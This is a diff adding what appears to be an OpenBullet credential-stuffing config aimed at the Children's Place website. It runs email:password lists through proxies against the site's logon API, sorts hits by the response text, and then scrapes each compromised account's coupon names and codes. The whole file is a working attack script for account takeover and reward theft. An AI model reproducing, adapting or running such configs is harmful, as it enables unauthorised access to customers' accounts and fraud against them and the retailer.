@@ -1,0 +1,56 @@
+[SETTINGS]
+{
+  "Name": "ChildrensPlaceBb",
+  "SuggestedBots": 1,
+  "LastModified": "2019-02-14T14:42:21.5468747+00:00",
+  "AdditionalInfo": "",
+  "Author": "Leehzet",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.childrensplace.com/api/logon" AutoRedirect=TRUE 
+  CONTENT "{\"reLogonURL\":\"TCPAjaxLogonErrorView\",\"URL\":\"TCPAjaxLogonSuccessView\",\"storeId\":\"10151\",\"rememberCheck\":\"true\",\"logonId1\":\"<USER>\",\"logonPassword1\":\"<PASS>\",\"rememberMe\":true,\"useTouchId\":false}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "LoginSuccess" 
+  KEYCHAIN Failure OR 
+    KEY "The email address or password you provided is invalid." 
+REQUEST GET "https://www.childrensplace.com/api/tcporder/getAllCoupons" AutoRedirect=TRUE 
+  CONTENT "" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: application/json, text/plain, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 4.4.2; SM-G955N Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Connection: keep-alive" 
+  HEADER "Pragma: no-cache" 
+  HEADER "deviceType: App" 
+  HEADER "catalogId: 10551" 
+  HEADER "langId: -1" 
+  HEADER "Access-Control-Max-Age: 1728000" 
+  HEADER "Cache-Control: no-cache, no-store, must-revalidate" 
+  HEADER "storeId: 10151" 
+  HEADER "Expires: 0" 
+  HEADER "Accept-Encoding: gzip,deflate" 
+  HEADER "Accept-Language: en-US" 
+  HEADER "X-Requested-With: com.childrensplace.tcpmobileapp" 
+PARSE "<SOURCE>" LR "\"promotionName\": \"" "\"," Recursive=TRUE -> CAP "reward" "" "" 
+PARSE "<SOURCE>" LR "\"code\": \"" "\"," Recursive=TRUE -> CAP "Code" "" "" 
